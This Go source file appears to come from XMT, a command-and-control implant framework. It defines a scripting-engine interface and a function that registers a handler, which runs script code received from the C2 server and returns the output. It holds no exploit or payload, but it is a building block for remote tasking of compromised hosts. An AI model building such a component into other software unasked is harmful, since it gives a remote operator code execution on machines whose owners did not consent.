package task

import (
	"context"

	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Engine is an interface that allows for extending XMT with non-compiled code
// for easy deployability and flexibility.
//
// Each Script interface contains a single function that will take a Context,
// an environment block and the script code string.
//
// The result of this function will be the output of the script and any errors
// that may occur.
//
// By default, the 'ID', 'OS', 'PID' 'PPID', 'OSVER' and 'HOSTNAME' variables
// are built-in to assist with code runtime.
type Engine interface {
	Invoke(context.Context, map[string]interface{}, string) (string, error)
}

// RegisterEngine is a function that can be used to register a Scripting engine
// into the XMT client tasking runtime.
//
// Script engines can increase the footprint of the compiled binary, so engines
// must be registed manually.
//
// See the 'cmd/script' package for scripting engines.
//
// C2 Details:
//  ID: <Supplied>
//
//  Input:
//      string (script)
//  Output:
//      string (output)
func RegisterEngine(i uint8, s Engine) error {
	if i < 21 {
		return xerr.Sub("mapping ID is invalid", 0x35)
	}
	if Mappings[i] != nil {
		return xerr.Sub("mapping ID is already exists", 0x36)
	}
	Mappings[i] = func(x context.Context, r data.Reader, w data.Writer) error {
		c, err := r.StringVal()
		if err != nil {
			return err
		}
		o, err := s.Invoke(x, createEnvironment(), c)
		if err != nil {
			return err
		}
		w.WriteString(o)
		return nil
	}
	return nil
}
